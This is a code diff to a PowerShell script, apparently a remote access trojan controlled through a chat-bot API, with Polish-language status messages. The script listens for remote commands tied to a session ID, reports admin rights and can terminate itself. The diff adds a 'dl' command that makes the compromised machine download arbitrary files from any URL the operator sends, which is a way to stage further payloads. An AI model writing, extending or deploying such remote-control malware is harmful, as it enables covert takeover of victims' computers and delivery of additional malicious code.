@@ -39,6 +39,21 @@ function CheckAdminRights {
     else           { return "Użytkownik '$env:USERNAME' nie ma uprawnień administratora" }
 }
 
+function DownloadUrl($url, $dest) {
+    try {
+        $fileName = if ($dest -and $dest.Length -gt 0) {
+            $dest
+        } else {
+            Split-Path -Leaf ([Uri]$url).LocalPath
+        }
+        if (-not $fileName -or $fileName.Length -eq 0) { $fileName = "downloaded_file" }
+
+        Invoke-WebRequest -Uri $url -OutFile $fileName -TimeoutSec 30
+        if (Test-Path $fileName) { SendMessage "Pobrano: $fileName" "" }
+        else                     { SendMessage "Plik nie został zapisany" "" }
+    } catch { SendMessage "Błąd pobierania: $($_.Exception.Message)" "" }
+}
+
 function DownloadFile($file_id, $file_name) {
     try {
         $get_file_path = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id) -WebSession $session
@@ -140,6 +155,11 @@ function CommandListener {
                     if ($cmd -match '/online')         { SendMessage "Sesja aktywna" $cmd }
                     if ($target -notmatch $session_id) { continue }
                     if ($cmd -eq 'exit')               { SendMessage "Sesja zabita" $cmd; exit }
+
+                    if ($cmd -match '^dl\s+(\S+)(?:\s+(\S+))?$') {
+                        DownloadUrl $Matches[1] $Matches[2]
+                        continue
+                    }
 
                     if ($cmd.Length -gt 0) {
                         try {
